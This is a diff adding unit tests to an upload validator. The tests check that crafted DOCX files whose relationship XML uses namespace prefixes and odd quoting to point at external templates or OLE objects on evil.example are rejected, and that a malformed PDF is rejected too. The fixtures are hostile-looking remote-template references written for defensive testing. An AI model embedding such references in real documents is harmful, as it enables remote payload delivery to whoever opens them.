@@ -128,6 +128,38 @@ describe("assertUploadStructure — OOXML", () => {
     );
   });
 
+  it("rejects external relationships with namespace prefixes and single-quoted attributes", async () => {
+    // Test namespace-prefixed Relationship element with single-quoted TargetMode
+    const withPrefixedTemplate = buildDocxZip((zip) => {
+      zip.file(
+        "word/_rels/settings.xml.rels",
+        `<?xml version="1.0" encoding="UTF-8"?>
+<ns:Relationships xmlns:ns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <ns:Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate' Target='https://evil.example/template.dotm' TargetMode='External'/>
+</ns:Relationships>`,
+      );
+    });
+    await expectRejection(
+      assertUploadStructure(docxMime, await toBuffer(withPrefixedTemplate)),
+      "references external content",
+    );
+
+    // Test mixed single/double quotes with namespace prefix
+    const withMixedQuotes = buildDocxZip((zip) => {
+      zip.file(
+        "word/_rels/settings.xml.rels",
+        `<?xml version="1.0" encoding="UTF-8"?>
+<r:Relationships xmlns:r="http://schemas.openxmlformats.org/package/2006/relationships">
+  <r:Relationship Id="rId1" Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject' Target="https://evil.example/object.bin" TargetMode='External'/>
+</r:Relationships>`,
+      );
+    });
+    await expectRejection(
+      assertUploadStructure(docxMime, await toBuffer(withMixedQuotes)),
+      "references external content",
+    );
+  });
+
   it("rejects unsafe entry paths", async () => {
     const traversal = buildDocxZip((zip) => {
       zip.file("word/../../escape.xml", "<x/>");
@@ -161,6 +193,12 @@ describe("assertUploadStructure — PDF and text", () => {
 
   it("rejects a truncated PDF without %%EOF", async () => {
     const pdf = Buffer.from("%PDF-1.7\n1 0 obj\n<<>>\nendobj\n");
+    await expectRejection(assertUploadStructure("application/pdf", pdf), "missing %%EOF");
+  });
+
+  it("rejects a PDF where %%EOF appears but is followed by non-whitespace content", async () => {
+    // Simulate %%EOF appearing inside an incomplete object (non-whitespace after %%EOF)
+    const pdf = Buffer.from("%PDF-1.7\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\nstartxref\n9\n%%EOF\n2 0 obj");
     await expectRejection(assertUploadStructure("application/pdf", pdf), "missing %%EOF");
   });
 
